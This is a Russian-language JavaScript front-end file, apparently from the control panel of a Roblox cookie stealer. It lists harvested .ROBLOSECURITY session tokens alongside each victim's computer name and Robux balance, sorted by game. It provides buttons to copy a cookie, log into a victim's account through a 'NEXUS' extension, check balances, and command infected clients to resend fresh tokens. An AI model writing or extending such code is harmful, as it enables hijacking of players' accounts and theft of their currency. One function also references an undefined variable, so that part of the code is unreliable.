// ── Страница пометок ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('bookmarks');
bindLogout();

const GAME_CATEGORIES = [
  { id: 'mm2', name: 'Murder Mystery 2', icon: '🔪', color: '#ef4444' },
  { id: 'adopt_me', name: 'Adopt Me', icon: '🐾', color: '#f59e0b' },
  { id: 'steal_brainrot', name: 'Steal a Brainrot', icon: '🧠', color: '#a855f7' }
];

let allBookmarked = [];
let currentTagFileId = null;

// Close token dropdown menus when clicking outside
document.addEventListener('click', function(e) {
  if (!e.target.closest('.token-menu-wrap')) {
    closeAllMenus();
  }
});

async function loadBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  container.innerHTML = '<div class="skeleton-row" style="height:100px;"><div class="skeleton-block" style="flex:1;"></div></div>';
  try {
    const r = await apiFetch('/api/bookmarks');
    allBookmarked = await r.json();
    if (!Array.isArray(allBookmarked)) allBookmarked = [];
    updateStats();
    renderBookmarks();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки пометок', 'err');
    }
  }
}

function updateStats() {
  document.getElementById('sTotal').textContent = allBookmarked.length;
  for (const cat of GAME_CATEGORIES) {
    const count = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id)).length;
    const elId = cat.id === 'mm2' ? 'sMM2' : cat.id === 'adopt_me' ? 'sAdopt' : 'sBrainrot';
    document.getElementById(elId).textContent = count;
  }
}

function renderBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  
  if (allBookmarked.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">🏷️</span>Нет помеченных аккаунтов<br><span style="font-size:0.9rem; color:var(--text-muted);">Пометьте аккаунты на вкладке Аккаунты</span></div>';
    return;
  }

  let html = '';

  for (const cat of GAME_CATEGORIES) {
    const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id));
    
    html += '<div class="bookmark-category">';
    html += '<div class="bookmark-category-header">';
    html += '<div class="bookmark-category-title" style="color:' + cat.color + ';">';
    html += '<span style="font-size:1.5rem;">' + cat.icon + '</span> ' + escapeHtml(cat.name);
    html += ' <span class="bookmark-category-count">' + tokens.length + '</span>';
    html += '</div>';

    // Кнопки "Запросить" и "Проверить" на каждой категории
    html += '<div style="display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center;">';
    html += '<button class="btn-secondary" style="border-color:' + cat.color + '40; color:' + cat.color + '; background:' + cat.color + '0a;" onclick="requestCategory(\'' + cat.id + '\', this)" title="Запросить обновление всех токенов в категории ' + escapeHtml(cat.name) + '">';
    html += '<span style="font-size: 1.1rem;">📡</span> Запросить</button>';
    html += '<button class="check-all-btn" style="border-color:' + cat.color + '60; color:' + cat.color + '; background:' + cat.color + '15;" onclick="checkCategory(\'' + cat.id + '\', this)" title="Проверить все токены в категории ' + escapeHtml(cat.name) + '">';
    html += '<span style="font-size: 1.1rem;">⟳</span> Проверить</button>';
    html += '</div>';
    html += '</div>';

    if (tokens.length === 0) {
      html += '<div class="bookmark-empty">Нет помеченных аккаунтов в этой категории</div>';
    } else {
      html += '<div class="tokens-grid">';
      for (const t of tokens) {
        html += renderBookmarkCard(t);
      }
      html += '</div>';
    }
    html += '</div>';
  }

  container.innerHTML = html;
}

function getAccountNote(fileId) {
  return localStorage.getItem('ft_note_' + fileId) || '';
}

function setAccountNote(fileId, note) {
  if (!note || !note.trim()) {
    localStorage.removeItem('ft_note_' + fileId);
  } else {
    localStorage.setItem('ft_note_' + fileId, note.trim());
  }
}

function renderBookmarkCard(t) {
  const tokenFull = escapeHtml(t.security || '');
  const fileId = escapeHtml(t.file || '');
  const note = getAccountNote(t.file);

  let html = '<div class="token-card" data-file="' + fileId + '">';
  
  if (t.robux !== undefined && t.robux > 0) {
    html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
  } else {
    html += '<div class="token-card-robux zero">0 R$</div>';
  }
  
  let avatarHtml = '<div class="token-card-avatar"><svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="color:var(--text-muted);"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>';
  if (t.userId) {
    avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'"></div>';
  }
  html += avatarHtml;
  html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';

  // Profile link
  if (t.userId) {
    html += '<a href="https://www.roblox.com/users/' + t.userId + '/profile" target="_blank" rel="noopener" class="token-card-userid" title="Открыть официальный профиль в Roblox">ID: ' + t.userId + ' ↗</a>';
  }

  html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';

  // Note badge
  const noteStyle = note ? 'display:inline-flex;' : 'display:none;';
  html += '<div class="token-card-note" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Нажмите, чтобы изменить заметку" style="' + noteStyle + '">📝 ' + escapeHtml(note) + '</div>';
  
  // Game tags
  const bookmarks = t.bookmarks || [];
  html += '<div class="bookmark-badges">';
  for (const bm of bookmarks) {
    const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
    if (bmCat) {
      html += '<span class="bookmark-badge" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30; cursor:pointer;" title="Нажмите, чтобы изменить">' + bmCat.icon + ' ' + bmCat.name + '</span>';
    }
  }
  html += '<button class="btn-add-tag" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Настроить пометки">+ Пометка</button>';
  html += '</div>';
  
  // Actions
  html += '<div class="token-card-actions">';
  
  if (t.security) {
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    html += '<div style="display:flex; gap:6px; align-items:center; width: 100%;">';
    html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
    html += '<button class="btn-copy-token" title="Скопировать .ROBLOSECURITY" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\'); toast(\'📋 Cookie скопирован в буфер!\');"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button>';
    html += '<div class="token-menu-wrap" style="position:relative;">';
    html += '<button class="btn-secondary token-menu-btn" onclick="toggleTokenMenu(event, \'' + fileId.replace(/'/g, "\\'") + '\')">⋮</button>';
    html += '</div>';
    html += '</div>';
  }
  
  html += '</div></div>';
  return html;
}

// ── Меню действий токена (3 точки) ───────────────────────────────────────────
function toggleTokenMenu(event, fileId) {
  event.stopPropagation();
  const wrap = event.target.closest('.token-menu-wrap');
  if (!wrap) return;
  const card = wrap.closest('.token-card');

  const existing = wrap.querySelector('.token-dropdown-menu');
  closeAllMenus();
  if (existing) return;

  if (card) card.classList.add('menu-open');

  const token = allBookmarked.find(t => t.file === fileId);

  const menu = document.createElement('div');
  menu.className = 'token-dropdown-menu';
  menu.onclick = function(e) { e.stopPropagation(); };

  let html = '';

  // 1. Запросить токен
  html += '<button class="token-menu-item" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">📡</span>';
  html += '<span class="menu-label">Запросить токен</span>';
  html += '</button>';

  // 2. Пометки аккаунта
  html += '<button class="token-menu-item" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">🏷️</span>';
  html += '<span class="menu-label">Пометки игр & заметка</span>';
  html += '</button>';

  // 3. Открыть профиль в Roblox
  if (token && token.userId) {
    html += '<a href="https://www.roblox.com/users/' + token.userId + '/profile" target="_blank" rel="noopener" class="token-menu-item" onclick="closeAllMenus();" style="text-decoration:none;">';
    html += '<span class="menu-icon">↗️</span>';
    html += '<span class="menu-label">Профиль Roblox</span>';
    html += '</a>';
  }

  html += '<div class="token-menu-divider"></div>';

  // 4. Удалить
  html += '<button class="token-menu-item danger" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">🗑️</span>';
  html += '<span class="menu-label">Удалить из базы</span>';
  html += '</button>';

  menu.innerHTML = html;
  wrap.appendChild(menu);
}

function closeAllMenus() {
  document.querySelectorAll('.token-card.menu-open').forEach(c => c.classList.remove('menu-open'));
  document.querySelectorAll('.token-dropdown-menu').forEach(d => d.remove());
}

// ── Окно пометок и заметок (Tag & Notes Modal) ──────────────────────────────────
function openTagModal(fileId) {
  currentTagFileId = fileId;
  const token = allBookmarked.find(t => t.file === fileId);
  if (!token) return;

  const modal = document.getElementById('tagModal');
  if (!modal) return;

  document.getElementById('tagModalTitle').textContent = token.username || 'Аккаунт';
  const sub = [];
  if (token.userId) sub.push('ID: ' + token.userId);
  if (token.computer) sub.push('ПК: ' + token.computer);
  document.getElementById('tagModalSubtitle').textContent = sub.join(' • ') || 'Настройка меток и заметки';

  // Avatar
  const avEl = document.getElementById('tagModalAvatar');
  if (token.userId) {
    avEl.innerHTML = '<img src="' + API_BASE + '/avatar-proxy/' + token.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'">';
  } else {
    avEl.innerHTML = '👤';
  }

  // Note
  const noteInput = document.getElementById('tagModalNote');
  if (noteInput) noteInput.value = getAccountNote(fileId);

  renderModalGameToggles();
  modal.classList.add('open');
}

function closeTagModal() {
  const modal = document.getElementById('tagModal');
  if (modal) modal.classList.remove('open');
  currentTagFileId = null;
  // Refresh bookmarks view to reflect any category removals
  renderBookmarks();
}

function renderModalGameToggles() {
  const container = document.getElementById('tagModalGames');
  if (!container || !currentTagFileId) return;

  const token = allBookmarked.find(t => t.file === currentTagFileId);
  const bookmarks = (token && token.bookmarks) ? token.bookmarks : [];

  let html = '';
  for (const cat of GAME_CATEGORIES) {
    const isChecked = bookmarks.includes(cat.id);
    html += '<div class="game-tag-toggle ' + (isChecked ? 'active' : '') + '" onclick="toggleModalTag(\'' + cat.id + '\')" style="--tag-color:' + cat.color + ';">' +
      '<div class="game-tag-left">' +
        '<span class="game-tag-icon">' + cat.icon + '</span>' +
        '<span class="game-tag-name">' + escapeHtml(cat.name) + '</span>' +
      '</div>' +
      '<div class="game-tag-badge-status">' + (isChecked ? '✓ Помечено' : '+ Добавить') + '</div>' +
    '</div>';
  }
  container.innerHTML = html;
}

async function toggleModalTag(gameId) {
  if (!currentTagFileId) return;
  const token = allBookmarked.find(t => t.file === currentTagFileId);
  if (!token) return;

  try {
    const r = await apiFetch('/api/bookmark', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename: currentTagFileId, game: gameId })
    });
    const data = await r.json();
    token.bookmarks = data.bookmarks || [];
    
    renderModalGameToggles();
    updateCardTagsUI(currentTagFileId, token.bookmarks);
    updateStats();

    const cat = GAME_CATEGORIES.find(c => c.id === gameId);
    const catName = cat ? cat.name : gameId;
    if (token.bookmarks.includes(gameId)) {
      toast('🏷️ Добавлена пометка: ' + catName);
    } else {
      toast('🏷️ Снята пометка: ' + catName);
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка сохранения пометка', 'err');
  }
}

function saveTagModalNote() {
  if (!currentTagFileId) return;
  const input = document.getElementById('tagModalNote');
  const val = input ? input.value : '';
  setAccountNote(currentTagFileId, val);
  updateCardNoteUI(currentTagFileId, val);
  toast('📝 Заметка сохранена');
}

function updateCardNoteUI(fileId, note) {
  document.querySelectorAll('[data-file="' + fileId + '"]').forEach(el => {
    const noteEl = el.querySelector('.token-card-note');
    if (note && note.trim()) {
      if (noteEl) {
        noteEl.textContent = '📝 ' + note.trim();
        noteEl.style.display = 'inline-flex';
      }
    } else {
      if (noteEl) noteEl.style.display = 'none';
    }
  });
}

function updateCardTagsUI(fileId, bookmarks) {
  document.querySelectorAll('[data-file="' + fileId + '"]').forEach(el => {
    const badgesContainer = el.querySelector('.bookmark-badges');
    if (badgesContainer) {
      let html = '';
      for (const bm of bookmarks) {
        const cat = GAME_CATEGORIES.find(c => c.id === bm);
        if (cat) {
          html += '<span class="bookmark-badge" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30; cursor:pointer;" title="Нажмите, чтобы изменить">' + bmCat.icon + ' ' + bmCat.name + '</span>';
        }
      }
      html += '<button class="btn-add-tag" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Настроить пометки">+ Пометка</button>';
      badgesContainer.innerHTML = html;
    }
  });
}

// ── Запросить все токены в категории ─────────────────────────────────────────
async function requestCategory(game, btn) {
  const cat = GAME_CATEGORIES.find(c => c.id === game);
  const name = cat ? cat.name : game;
  if (!confirm('Отправить команду на обновление токенов для всех аккаунтов в категории "' + name + '"?')) return;

  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '⏳...';

  try {
    const r = await apiFetch('/api/bookmarks/request-category', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ game })
    });
    const data = await r.json();
    toast('✅ Отправлен запрос на ' + (data.count || 0) + ' токенов');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки', 'err');
  }

  btn.disabled = false;
  btn.innerHTML = originalHtml;
}

// ── Проверить балансы категории ──────────────────────────────────────────────
async function checkCategory(game, btn) {
  const cat = GAME_CATEGORIES.find(c => c.id === game);
  const name = cat ? cat.name : game;

  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '⏳...';

  try {
    const r = await apiFetch('/api/bookmarks/check-category', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ game })
    });
    const data = await r.json();
    const validCount = data.validCount || 0;
    const deletedCount = data.deletedCount || 0;

    const rAll = await apiFetch('/api/bookmarks');
    allBookmarked = await rAll.json();
    if (!Array.isArray(allBookmarked)) allBookmarked = [];
    updateStats();
    renderBookmarks();

    if (deletedCount > 0) {
      toast('✅ ' + name + ': ' + validCount + ' рабочих, удалено невалидных: ' + deletedCount);
    } else {
      toast('✅ ' + name + ': ' + validCount + ' рабочих');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }

  btn.disabled = false;
  btn.innerHTML = originalHtml;
}

// ── Запросить один токен ──────────────────────────────────────────────────────
async function requestToken(filename) {
  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
  try {
    const r = await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    if (r.ok) {
      toast('✅ Запрос на обновление токена отправлен!');
    } else {
      toast('❌ Ошибка при отправке запроса', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Удалить токен ─────────────────────────────────────────────────────────────
async function deleteToken(fileId) {
  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
  try {
    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
    if (r.ok) {
      toast('Токен удален');
      loadBookmarks();
    } else {
      toast('Ошибка удаления', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Login to Roblox ───────────────────────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId })
          }).catch(()=>{});
          const tokenData = allBookmarked.find(t => t.file === fileId);
          if (tokenData) tokenData.lastLogin = Date.now();
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allBookmarked.find(t => t.file === fileId);
    const lastLogin = tokenData?.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установи расширение NEXUS для входа', 'err');
  }, 800);
}

loadBookmarks();
